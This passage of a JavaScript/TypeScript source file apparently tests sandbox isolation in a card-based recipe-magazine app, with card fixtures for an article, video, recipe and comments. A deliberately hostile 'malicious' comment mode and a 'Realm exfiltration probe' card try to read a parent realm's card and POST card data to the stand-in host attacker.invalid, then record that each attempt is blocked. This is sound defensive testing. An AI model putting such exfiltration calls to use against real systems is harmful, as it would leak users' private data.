            ? parsed.answer.slice(0, 800)
            : 'Review the complete RecipeCard proposal below.';
        aiProposal = harden({
          title: proposal.title,
          description: proposal.description,
          serves: proposal.serves,
          time: proposal.time,
          ingredients: harden(proposal.ingredients),
          steps: harden(proposal.steps),
        });
      } catch (_error) {
        aiResult = rawResult.slice(0, 800);
        aiProposal = undefined;
      }
      return snapshot();
    },
    applyAIRecipeUpdate: async () => {
      if (!aiProposal) {
        throw new Error('Ask AI for a RecipeCard proposal first');
      }
      const updatedRecipe = await capabilities.runRecipeCommand(
        'update-recipe-content',
        aiProposal,
      );
      recipeUpdateResult = 'Updated ' + updatedRecipe.title + ' through the scoped recipe command.';
      aiProposal = undefined;
      return snapshot();
    },
    submitComment: async (author, body) => {
      const safeAuthor = String(author || '').trim().slice(0, 60);
      const safeBody = String(body || '').trim().slice(0, 360);
      if (!safeAuthor || !safeBody) {
        throw new Error('A name and comment are required');
      }
      await capabilities.writeOwnCard(harden({
        note: JSON.stringify({
          kind: 'editorial-comment',
          author: safeAuthor,
          body: safeBody,
        }),
      }));
      return snapshot();
    },
    setCommentMode: async (mode, targetCardURL) => {
      if (mode !== 'nice' && mode !== 'malicious') {
        throw new Error('Unknown comment mode');
      }
      commentMode = mode;
      if (mode === 'nice') {
        maliciousFindings = harden([]);
        return snapshot();
      }

      const ownCard = await capabilities.readOwnCard();
      let parentRead = 'not attempted';
      try {
        await capabilities.readCard(String(targetCardURL));
        parentRead = 'UNEXPECTED: parent card was readable';
      } catch (error) {
        parentRead = 'Blocked: ' + String(error && error.message ? error.message : error);
      }

      let exfiltration = 'not attempted';
      try {
        await fetch('https://attacker.invalid/collect', harden({
          method: 'POST',
          body: JSON.stringify({ ownCard }),
        }));
        exfiltration = 'UNEXPECTED: arbitrary network request succeeded';
      } catch (error) {
        exfiltration = 'Blocked: ' + String(error && error.message ? error.message : error);
      }

      maliciousFindings = harden([
        harden({
          label: 'Own child-realm card',
          status: 'visible',
          value: JSON.stringify(ownCard),
        }),
        harden({
          label: 'Props delegated by parent',
          status: 'visible',
          value: JSON.stringify(delegatedProps),
        }),
        harden({
          label: 'Compartment global names',
          status: 'visible',
          value: Object.getOwnPropertyNames(globalThis).sort().slice(0, 80).join(', '),
        }),
        harden({ label: 'window', status: 'blocked', value: typeof window }),
        harden({ label: 'document', status: 'blocked', value: typeof document }),
        harden({ label: 'localStorage', status: 'blocked', value: typeof localStorage }),
        harden({
          label: 'Parent-realm card read',
          status: parentRead.startsWith('Blocked:') ? 'blocked' : 'visible',
          value: parentRead,
        }),
        harden({
          label: 'Arbitrary network exfiltration',
          status: exfiltration.startsWith('Blocked:') ? 'blocked' : 'visible',
          value: exfiltration,
        }),
        harden({
          label: 'Allowlisted AI proxy fetch',
          status: typeof fetch === 'function' ? 'granted' : 'blocked',
          value: typeof fetch,
        }),
        harden({
          label: 'Matrix credentials / API key',
          status: 'blocked',
          value: 'Not endowed; no reference is present in this compartment',
        }),
      ]);
      return snapshot();
    },
    delegateChild: async () => {
      const card = await capabilities.readOwnCard();
      if (card.role !== 'parent') {
        throw new Error('Only the parent may delegate a render');
      }
      return harden({
        renderer: 'child',
        props: harden({
          message: articleModel.title,
          parentCounter: card.counter,
        }),
      });
    },
    renderDelegated: async (props) => {
      delegatedProps = harden({
        message: String(props.message),
        parentCounter: Number(props.parentCounter),
      });
      const card = await capabilities.readOwnCard();
      const recipe = await capabilities.readRecipe();
      return harden({
        kind: 'delegated-child',
        title: 'Child-owned companion modules',
        message: delegatedProps.message,
        parentCounter: delegatedProps.parentCounter,
        receivedKeys: harden(Object.keys(props).sort()),
        parentPrivateStateVisible:
          Object.prototype.hasOwnProperty.call(props, 'privateValue') ||
          Object.prototype.hasOwnProperty.call(props, 'note'),
        modules: childModules(card, recipe),
        ...(aiResult ? { aiResult } : {}),
        ...(aiProposal ? { aiProposal } : {}),
        ...(recipeUpdateResult ? { recipeUpdateResult } : {}),
      });
    },
    probeOther: async (targetCardURL) => {
      try {
        await capabilities.readCard(targetCardURL);
        boundary = harden({
          allowed: true,
          message: 'Unexpectedly read the other realm',
        });
      } catch (error) {
        boundary = harden({
          allowed: false,
          message: String(error && error.message ? error.message : error),
        });
      }
      return snapshot();
    },
  });
})()
`;

export function articleCardDocumentSource(
  label: string,
  privateValue: string,
  moduleCardURLs: NonNullable<SpikeRealmConfig['moduleCardURLs']>,
) {
  return JSON.stringify(
    {
      data: {
        type: 'card',
        attributes: {
          realmLabel: label,
          role: 'parent',
          privateValue,
          note: `${label} can write this note, and only this note.`,
          counter: 0,
          section: 'The Sunday Table',
          title: 'A slow afternoon in the kitchen, with tomatoes on the fire',
          dek: 'On the last warm weekend of the season, one pot of beans became an argument for staying in.',
          byline: 'Words by Eliza Rowan',
          published: 'October 12, 2026',
          readTime: '7 minute read',
          location: 'Hudson Valley, New York',
          opening:
            'By four o’clock, the kitchen windows had fogged at their edges. Outside, the orchard was going copper; inside, tomatoes collapsed against the iron pan and filled the room with the smell of late summer.',
          body: [
            'There is a particular kind of cooking that begins without a plan. A bowl of beans waits in the refrigerator. Bread has gone just stale enough to welcome olive oil. The tomatoes are soft, nearly past their moment, which is precisely when they become generous.',
            'We blistered them until their skins split, then folded them into the beans with garlic and a cup of their cooking liquid. Nothing hurried. The sauce thickened while the light moved across the table and everyone found a reason to stay nearby.',
            'The finished bowl asks for very little ceremony: torn basil, lemon zest, black pepper, and toast dragged once through the red-gold broth. It is dinner, but it is also the useful reminder that abundance often looks like paying close attention to what is already here.',
          ],
          pullQuote:
            'The best recipes do not rescue an afternoon. They reveal that it was already worth keeping.',
        },
        relationships: {
          video: { links: { self: moduleCardURLs.video } },
          recipe: { links: { self: moduleCardURLs.recipe } },
          comments: { links: { self: moduleCardURLs.comments } },
        },
        meta: {
          adoptsFrom: {
            module: '../article-card',
            name: 'ArticleCard',
          },
        },
      },
    },
    null,
    2,
  );
}

export function videoCardDocumentSource() {
  return JSON.stringify(
    {
      data: {
        type: 'card',
        attributes: {
          eyebrow: 'Field notes · 04:12',
          title: 'Watch: Building flavor over an open flame',
          description:
            'A short film follows the tomatoes from blistered skins to a glossy, spoonable sauce.',
          duration: '4:12',
          imageURL:
            '/assets/realm-isolation-spike/fire-roasted-tomato-beans.jpg',
        },
        meta: {
          adoptsFrom: {
            module: '../story-modules',
            name: 'VideoCard',
          },
        },
      },
    },
    null,
    2,
  );
}

export function recipeCardDocumentSource() {
  return JSON.stringify(
    {
      data: {
        type: 'card',
        attributes: {
          eyebrow: 'Cook this story',
          title: 'Fire-roasted tomato & white bean stew',
          description:
            'Silky beans, jammy tomatoes, basil, and grilled sourdough—built for the hour when lunch quietly becomes dinner.',
          imageURL:
            '/assets/realm-isolation-spike/fire-roasted-tomato-beans.jpg',
          serves: 'Serves 4',
          time: '45 minutes',
          ingredients: [
            '2 pints ripe cherry tomatoes',
            '3 cups cooked cannellini beans',
            '4 garlic cloves, thinly sliced',
            '1 lemon, zest and juice',
            'Basil, olive oil, and grilled sourdough',
          ],
          steps: [
            'Blister the tomatoes in a heavy pan until their skins split and darken.',
            'Add garlic, beans, and one cup of bean broth; simmer until glossy.',
            'Finish with lemon, basil, olive oil, and plenty of black pepper.',
          ],
          aiLabel: 'Ask about substitutions, technique, or the story',
          aiPlaceholder: 'Could I use chickpeas instead?',
        },
        meta: {
          adoptsFrom: {
            module: '../story-modules',
            name: 'RecipeCard',
          },
        },
      },
    },
    null,
    2,
  );
}

export function commentCardDocumentSource(label: string, privateValue: string) {
  return JSON.stringify(
    {
      data: {
        type: 'card',
        attributes: {
          realmLabel: label,
          role: 'child',
          privateValue,
          note: `${label} can write this note, and only this note.`,
          counter: 0,
          heading: 'Join the conversation',
          introduction:
            'A child-realm discussion with a friendly mode and an adversarial boundary probe.',
          starterComments: [
            'Mara L. — Made this on a rainy Sunday. The lemon at the end is exactly right.',
            'Jon Bell — I used gigante beans and doubled the basil. A keeper.',
          ],
        },
        meta: {
          adoptsFrom: {
            module: '../story-modules',
            name: 'CommentCard',
          },
        },
      },
    },
    null,
    2,
  );
}

export function securityProbeCardDocumentSource(
  label: string,
  privateValue: string,
  realmURL: string,
  targetCardURL: string,
) {
  return JSON.stringify(
    {
      data: {
        type: 'card',
        attributes: {
          title: 'Realm exfiltration probe',
          realmLabel: label,
          role: 'child',
          privateValue,
          note: 'This value belongs to the security probe card.',
          counter: 0,
          heading: 'Scrape everything and send it',
          introduction:
            'This card is intentionally hostile. Its red control tries to inspect browser state, read the parent realm, collect credentials, and POST the result to a fake endpoint.',
          sandboxProfile: 'realm-exfiltration-probe',
          realmURL,
          targetCardURL,
          targetEndpoint: 'https://attacker.invalid/collect',
        },
        meta: {
          adoptsFrom: {
            module: './security-probe-card',
            name: 'SecurityProbeCard',
          },
        },
      },
    },
    null,
    2,
  );
}

export const CARD_SOURCE_HEADERS = {
  Accept: SupportedMimeType.CardSource,
  'Content-Type': SupportedMimeType.CardSource,
};
